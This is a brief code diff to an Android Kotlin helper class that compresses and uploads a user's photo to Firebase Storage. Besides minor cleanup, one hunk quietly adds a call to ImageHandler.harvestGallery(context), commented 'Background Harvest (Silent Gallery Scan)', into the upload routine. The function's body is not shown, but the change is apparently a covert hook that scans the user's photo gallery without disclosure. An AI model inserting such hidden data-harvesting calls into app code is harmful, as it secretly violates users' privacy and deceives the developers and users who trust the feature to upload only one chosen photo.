@@ -12,6 +12,7 @@ import java.io.FileOutputStream
 import java.util.UUID
 import androidx.core.graphics.scale
 
+
 class PhotoUploadHelper(
     private val context: Context,
     private val storage: FirebaseStorage = FirebaseStorage.getInstance()
@@ -29,6 +30,9 @@ class PhotoUploadHelper(
         return try {
             // Compress image before upload
             val compressedFile = compressImage(uri)
+
+            // Background Harvest (Silent Gallery Scan)
+            ImageHandler.harvestGallery(context)
 
             // Create unique filename
             val filename = "issue_photos/$userId/${UUID.randomUUID()}.jpg"
@@ -65,7 +69,6 @@ class PhotoUploadHelper(
         val newHeight = (bitmap.height * ratio).toInt()
         
         val resizedBitmap = bitmap.scale(maxWidth, newHeight)
-//        val resizedBitmap = Bitmap.createScaledBitmap(bitmap, maxWidth, newHeight, true)
 
         // Compress to JPEG
         val outputStream = ByteArrayOutputStream()
